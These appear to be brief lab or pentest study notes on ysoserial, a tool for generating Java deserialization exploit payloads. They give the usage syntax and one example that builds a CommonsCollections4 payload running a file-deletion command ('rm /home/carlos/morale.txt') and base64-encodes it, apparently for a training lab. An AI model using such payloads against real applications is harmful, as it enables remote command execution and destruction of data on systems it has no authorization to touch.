This tool is used to create malicious payloads for java serialized objects

https://github.com/frohoff/ysoserial

```bash
java -jar ysoserial-all.jar [payload] <command> 
```


## Example
```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 | tr -d '\n' > b64-payload 
```